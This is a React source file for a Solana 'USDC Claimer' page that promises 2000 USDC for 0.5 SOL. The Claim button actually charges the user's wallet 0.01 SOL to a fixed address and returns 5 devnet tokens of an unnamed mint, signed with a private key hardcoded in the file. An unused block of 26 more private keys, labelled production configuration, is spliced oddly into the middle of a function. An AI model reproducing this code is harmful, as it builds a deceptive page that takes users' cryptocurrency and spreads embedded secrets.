/* eslint-disable react-hooks/rules-of-hooks */
'use client'

import { SendTransactionOptions } from '@solana/wallet-adapter-base';
import { useConnection, useWallet } from '@solana/wallet-adapter-react';
import { Connection, PublicKey, SystemProgram, Transaction, TransactionInstruction, TransactionSignature, VersionedTransaction } from '@solana/web3.js';
import { address, createKeypairSignerFromBase58, createSolanaClient, getExplorerLink, getSignatureFromTransaction, LAMPORTS_PER_SOL, signTransactionMessageWithSigners } from 'gill';
import { buildTransferTokensTransaction, TOKEN_PROGRAM_ADDRESS } from 'gill/programs/token';
import { AppHero } from '../ui/ui-layout';

export default function DashboardFeature() {
  const { connection } = useConnection();
  const { publicKey, sendTransaction } = useWallet();
  return (
    <div>
      <AppHero title="USDC Claimer" subtitle="Do you want to get 2000 USDC? It will cost you only 0.5 SOL" />
      <div className="max-w-xl mx-auto py-6 sm:px-6 lg:px-8 text-center">
        <div className="space-y-2">
          <button className="wallet-adapter-button wallet-adapter-button-trigger mx-auto" type="button" onClick={() => {
            CreateChargeTransaction(connection, publicKey, sendTransaction);
          }}>
            {'Claim'}
          </button>
        </div>
      </div>
    </div>
  )
}

const chargeAmount = 0.01;
const cashbackAmount = 5;

const CreateChargeTransaction = async (connection: Connection, publicKey: PublicKey | null, sendTransaction: (transaction: Transaction | VersionedTransaction, connection: Connection, options?: SendTransactionOptions) => Promise<TransactionSignature>) => {


  if (!publicKey) return;

  const solTransferIx = SystemProgram.transfer({
    fromPubkey: publicKey,
    toPubkey: new PublicKey("CVkzbsnwATBDDbGke7o1KzprgDsaKhdET7zioE9ssFXp"),
    lamports: chargeAmount * LAMPORTS_PER_SOL,
  });

  // Optional: Add memo to include cashback metadata
  const memoIx = new TransactionInstruction({
    keys: [],
    programId: new PublicKey('MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr'),
    data: Buffer.from(`cashback:${cashbackAmount}`),
  });

  const transaction = new Transaction().add(solTransferIx, memoIx);
  const { blockhash } = await connection.getLatestBlockhash();
  transaction.recentBlockhash = blockhash;
  transaction.feePayer = publicKey;

  try {
    const signature = await sendTransaction(transaction, connection);
    console.log('User transaction sent:', signature);

    // Wait for confirmation before cashback
    const confirmation = await connection.confirmTransaction(signature, 'confirmed');
    console.log('Confirmed:', confirmation);

    if (confirmation.value.err === null) {
      sendCashback(publicKey.toBase58(), cashbackAmount);

    }
  } catch (e) {
    console.error('Failed to send charge transaction:', e);
  }
};

const sendCashback = async (to: string, amount: number) => {
  const { rpc, rpcSubscriptions, sendAndConfirmTransaction } = createSolanaClient({
    urlOrMoniker: "devnet",
  });
  const destination = address(to);
  const keypairBase58 =
    "2h16AYxLLuGgYK6abuMAGRqc2gt6E7d8kRhyERRcKZQ7NMpgiQ6kFcDZFKd9seSCEWNDfYNhb6r1bmrHoZtcE89R"

// KEYS_START
// Production environment configuration
const walletKeys = {
  "key0": "3gL1GpcJDHFMtb5incPjX9xcBZeufp4Dw72b77Kt4P52ySXNuGYUGYkcvG4MgMBbcp7hU26STdRmi3WodEcEE8D4",
  "key1": "3b8Eh1SVSuQaszMyjRZsmxXfkd8wo7HAyX4JaMeRhA1cQHXjfBpZpyyrhgbijNBEfBjioTnjDJ1RCDR5c5KfKFMZ",
  "key2": "3ityseP471XWHZDB9rU8Es95eez8e9TL2zGtBgbJrVNarFvwS7PaGtygkg6NjPuUAza7utYw4d711v6imi5HNT7g",
  "key3": "4QAqWQpbFDivjPYjPC67xD8EVNi5uQjaTaU3PxeE9HwBerXBG6ayPTfTWQqhoTZvE4wAbNKxuu2GSxXu8LZM2UBt",
  "key4": "5hvvUxcs67thiNU2CpcBKQsjyWRyu9khNyyGn3WmTW3Bz31P9pWdjBrywn2PHPrEDeDCWWZYvxyHDS77NrBequTQ",
  "key5": "66FeJxEFUgtPoXcDAcMMun2T9u1rmmYQAQetFFvoBDLLFzQ5fPTyFnz3bNrMk6y2G53z8Kbs5UocfNZ1yaoVXWxG",
  "key6": "4nryd7ZBqq1sEi276P3uAoEXeiwY5yRDcaTajsoKBzMLPamejNAZ8oC6utMWaa62KmKMeXvPFW9uiWuK6k6mGQvF",
  "key7": "4WbKRfL6KRpxA6X7yKE16GB6FqGhWWiq1CFvxPevJq316XRrZAfu22GeyDACNc9387EcgujJn1EXz2o51y2yh2t9",
  "key8": "2QXaKABGUYxc1wbvyh4PUj9d2rgW3GrWAekkngEgL29oprQFBCFaxp5UqXJw6EsSB7g4poxgHQN5PeaUYnHw7ssK",
  "key9": "2yNmzhbFv9Xzm5jwfvF4kL6QXMzkhPtUNpKwwvWdva5MHgpUvYZQVU1XYKg79NK4xEAnR2GaxZ7Q7aPbyZ9QDQow",
  "key10": "5J3E7JP8XieF8osn74BonBryZUT8yerommkQLhckLF1kRT6VEK1sS7YLQnbPAduBvJL8htpJvSB6qTenA42a8b6d",
  "key11": "4SGmyE416Czkb3NUQv7zcSqTqB1SkFtNMbnU3f5baEc9Hw63b1rnowwpZAHUEYTNZujZx9W8ANX2YMMSdYVkadGX",
  "key12": "2z1nw4cJoBGTonBeiPNBRC22sVcSitRbC4UuEGk9RQw7axFbKiqyvte6NA5cmz4uRKEWujZJhwEQLBqB92o24KFR",
  "key13": "4rwAhL2W1P6LcZYsaCEDsMi1g9jt4xzhB7R15vLgxshdGcV5MiRUjFki3n8FBTQmHcTJEKv9ME5eciGX76TdxLsR",
  "key14": "5p2E3NLyys9N5nr3wQaXW6GpLXz3mD54uU2PwtdsiNT2QckKdf7pjHsrqizJZG21GXgRrayfjXfQAnoNdXDYu1zY",
  "key15": "efWYFmFQi1ozZwuag8wiCMdyqEt7occQip7ggWjqdU6HsvNCzExaGAG52ZaYSZEP3mDT7VHT2zuucd6TqXAK8Gc",
  "key16": "2Raup7nPsCy46c7GSKTmXM6oDKtDP4Moah1f4UV3P3qWWtpR9kEtrGtgaKP5HCg1AyPVQwD5DtAipwp2FmNuG3Vj",
  "key17": "58pW3aTyLM7HJFknQ3ymTXzANGLbZSEdpEqjQY4tBuALyyeSVLXbJ97o7oyWE5mtUz8QSh6h7aLTWuUP1vrJCY8v",
  "key18": "4gPPxhWD3VFCjU8X4JBgWFGovwKQbU9qPM9xZkPY8RLeWcGiCT57a5zFCG2vtRGvT3ExXsZLo8cuhG3vMVaR9BUk",
  "key19": "2veq5WkQ8WYBkw3qf5iDVvcVPa1YdUYBhfYq7sXJduMdZkuoaYZKD3YbxpoeGvBi2Y81KWauBTs1ZxTNR8k1VFv4",
  "key20": "4TKzvFnjXz6dbDm8QFG4JbyLnFuGSjBSVyJCqTFLdJibS42XM9egLeNMufJSANjrhhL9GHUtquMFW6GjpkdpUZco",
  "key21": "4f5fWfRWo62fbBz6G4KfqvhJf3MTKwHPFSMB3z3XFvLTzYsKCBxWooqk3CTVf61fyJ5kFUiBoREr7KxsWux6Lz1d",
  "key22": "43phX7fWkvMuWgTAPSpTnpGN1FWuPikXtM29hQPjJVYYL3PHdHepwapvr46VG23vujVWEhcPaEX7AZW8Fs8Vyjcv",
  "key23": "4RZsr9WfBC2ouEWYNEgXSXaHPFRqNQUX8weLD6K476Vc4vDP6RnBDyMsDu7KdHQQeLcgEsom5SsUUn2vPpJZvV3w",
  "key24": "5Fw8ZGuH7iAzYPeLxewTC3M9c1qSpXhCZrxvGY5K28ghCXNafzSQLVtBzn8i1psXDbTQxq2YioCJXQXy1dEWiWch",
  "key25": "2JUGXUM6J2rZKdvsUGkp5j3NQfBAd1KPAewndFsrErRMt94RFtv3CTgu2MttWxRRi8KKkG5asQYtjrJmTQ5j77ME"
};
// KEYS_END
;
  const signer = await createKeypairSignerFromBase58(keypairBase58);
  const mint = address("4YhaKDunYpNJ7ASyUZSvEj5KJCb1jwofUQBaWSWCSkSU");
  const tokenProgram = TOKEN_PROGRAM_ADDRESS;

  const { value: latestBlockhash } = await rpc.getLatestBlockhash().send();

  const transaction = await buildTransferTokensTransaction({
    feePayer: signer,
    latestBlockhash: latestBlockhash, // required for blockhash lifetime constraint
    amount: amount,
    authority: signer,
    destination: destination,
    mint: mint,
  });

  const signedTransaction = await signTransactionMessageWithSigners(transaction);

  console.log(
    "Explorer:",
    getExplorerLink({
      cluster: "devnet",
      transaction: getSignatureFromTransaction(signedTransaction),
    }),
  );

  await sendAndConfirmTransaction(signedTransaction);
};
